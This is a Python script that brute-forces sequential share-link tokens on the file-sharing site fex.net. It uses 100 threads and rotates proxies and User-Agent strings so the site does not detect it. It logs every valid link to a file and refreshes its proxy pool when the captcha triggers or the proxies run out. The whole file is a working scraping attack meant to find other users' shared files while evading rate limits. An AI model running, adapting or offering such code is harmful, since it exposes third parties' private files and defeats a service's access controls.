import asyncio
import os
from concurrent.futures import ThreadPoolExecutor
import time
from random import choice
import requests

from create_proxy_list_HTTPS import get_html, get_new_proxy, add_proxy_to_file


def get_list_proxy():
    """
    Func use data from files and generate random combination of proxy and User-Agent
    :return: random combination proxy and useragent
    """
    # print(os.getcwd())
    with open(os.getcwd() + '/proxies.txt', 'r') as f:
        proxies = f.read().split('\n')
        try:
            proxies.remove('')
        except ValueError:
            pass

    with open(os.getcwd() + '/useragents.txt', 'r') as f:
        useragents = f.read().split('\n')

    return proxies, useragents


def clean_proxy_list(proxy):
    try:
        PROXY_LIST.remove(proxy.get('https').split('//')[1])
    except ValueError:
        pass


def wget(url):
    while True:
        useragent = {'User-Agent': choice(USERAGENT_LIST)}
        proxy = {'https': 'https://' + choice(PROXY_LIST)}

        print(f"wget {url}----->{proxy}")
        try:
            res = requests.get(url, headers=useragent, proxies=proxy, timeout=2)
            respons_data = res.json()
            # return res.headers
        except requests.ConnectionError as e:
            clean_proxy_list(proxy)
            # print("OOPS!! Connection Error. Make sure you are connected to Internet. Technical Details given below.\n")
            # print(str(e))
            continue
        except requests.Timeout as e:
            clean_proxy_list(proxy)
            # print("OOPS!! Timeout Error")
            # print(str(e))
            continue
        except requests.RequestException as e:
            clean_proxy_list(proxy)
            # print("OOPS!! General Error")
            # print(str(e))
            continue
        except KeyboardInterrupt:
            print("Someone closed the program")
            break

        if respons_data.get('result') == 1:
            with open('DB.txt', 'a+') as f:
                f.write(f'{url}\n')
            time.sleep(1)
            break

        elif respons_data.get('result') == 0 and respons_data.get('captcha') == 1:
            print(url, proxy, respons_data)
            print('FEX.NET - detect us. We need to update proxybase, and continue about some time')

        # print(url)
        break


async def wget_tasks(executor):
    loop = asyncio.get_event_loop()
    bloking_tasks = []
    for url in urls:
        task = loop.run_in_executor(executor, wget, url)
        task.__url = url
        bloking_tasks.append(task)
    complted, pending = await asyncio.wait(bloking_tasks)
    results = {t.__url: t.result() for t in complted}
    # for url, result in sorted(results.items(), key=lambda x: x[0]):
    #     print("wget", url, result)


def write_to_file(proxies: list):
    """
    Write input list of proxies into file
    :param proxies: list proxies as host:port pare
    :return:
    """
    with open(os.getcwd() + '/proxies.txt', 'w') as file:
        for i in proxies:
            file.write(f'{i}\n')

    print('Write comlete!')


if __name__ == '__main__':
    workers = 100
    PROXY_LIST, USERAGENT_LIST = get_list_proxy()
    token = 254002136116
    while True:
        urls = [f'https://fex.net/j_object_view/{token}' for token in range(token, token + workers)]

        executor = ThreadPoolExecutor(max_workers=workers)
        loop = asyncio.get_event_loop()
        start = time.time()
        loop.run_until_complete(wget_tasks(executor))
        print("Asyncio + request + ProcessPoolExecutor cost:", time.time() - start)
        if len(PROXY_LIST) == 0:
            add_proxy_to_file(get_new_proxy(get_html()))
        write_to_file(PROXY_LIST)
        token = token + workers

